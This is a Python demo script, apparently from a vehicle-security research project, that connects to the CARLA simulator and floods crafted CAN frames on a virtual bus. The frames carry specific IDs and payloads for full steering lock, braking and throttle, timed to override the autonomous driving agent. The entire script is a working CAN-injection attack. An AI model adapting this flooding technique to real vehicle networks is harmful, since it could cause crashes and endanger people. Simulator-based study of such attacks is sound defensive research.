"""
Foolproof Windows CAN-attack demo for CARLASec.

Run the car in one terminal:
    python client_run.py --host 127.0.0.1 --spawnpos 5,46
Then run this in another terminal:
    python win_attack_demo.py

It connects to CARLA, WAITS until the ego car is actually driving, then injects
the README throttle-manipulation frame (vcan0 000001A0#5508010100000012) so the
car loses control. Logs speed and heading so the effect is visible in numbers
too. This removes the cross-terminal timing problem: you cannot mistime it.

Pass an attack type as the first arg:
    python win_attack_demo.py throttle   # 000001A0#5508010100000012 (default)
    python win_attack_demo.py steering   # 000000C4#5FFFFFFF0000003A (visible swerve)
"""
import sys, time, math, threading
import carla
import can  # shim auto-loaded via .pth

# (can_id, payload, interval_seconds).
# The "spin" attack floods an aggressive engine-data frame every ~0.02s so it
# overrides the autonomous agent's control on nearly every tick, making the car
# lose control. The gentle README rate (0.3s) is too slow to override the
# ~30 Hz agent and looks like normal driving.
ATTACKS = {
    # DBC-encoded frames flooded so they override the agent every tick.
    "steering": (0xC4,  "64640001010000ca", 0.02),   # SteeringPosition=1.0 -> full lock, swerve
    "brake":    (0x1A0, "0000640100000065", 0.02),   # Brake_active=1, BrakePressed=1.0 -> full brake
    "speed":    (0x1A0, "6410000000000074", 0.02),   # VehicleSpeed=100, MovingForward=1 -> full throttle
    "throttle": (0x1A0, "5508010100000012", 0.3),    # README payload, gentle (little visible effect)
}
which = sys.argv[1] if len(sys.argv) > 1 else "steering"
arb_id, data_hex, interval = ATTACKS.get(which, ATTACKS["steering"])

client = carla.Client("127.0.0.1", 2000)
client.set_timeout(10.0)
world = client.get_world()

def state():
    vehs = world.get_actors().filter("vehicle.*")
    if not vehs:
        return None
    v = vehs[0].get_velocity()
    spd = 3.6 * math.sqrt(v.x**2 + v.y**2 + v.z**2)
    return spd, vehs[0].get_transform().rotation.yaw

print("Waiting for the car to start driving...", flush=True)
t0 = time.time()
while time.time() - t0 < 60:
    st = state()
    if st and st[0] > 5.0:
        print(f"Car moving ({st[0]:.1f} km/h). Attacking with {which}.", flush=True)
        break
    time.sleep(0.5)
else:
    print("Car never started moving. Is client_run.py runninpg and driving?", flush=True)
    sys.exit(1)

bus = can.interface.Bus(channel="vcan0", bustype="socketcan")
msg = can.Message(arbitration_id=arb_id, data=bytes.fromhex(data_hex), is_extended_id=False)
stop = threading.Event()
def sender():
    while not stop.is_set():
        bus.send(msg)
        time.sleep(interval)
threading.Thread(target=sender, daemon=True).start()

print(f"=== INJECTING {which} (id 0x{arb_id:X} data {data_hex}) for 12s ===", flush=True)
for _ in range(12):
    st = state()
    print(f"  speed={st[0]:6.2f} km/h  yaw={st[1]:7.1f}" if st else "  (car gone)", flush=True)
    time.sleep(1)
stop.set(); time.sleep(0.4); bus.shutdown()
print("done", flush=True)
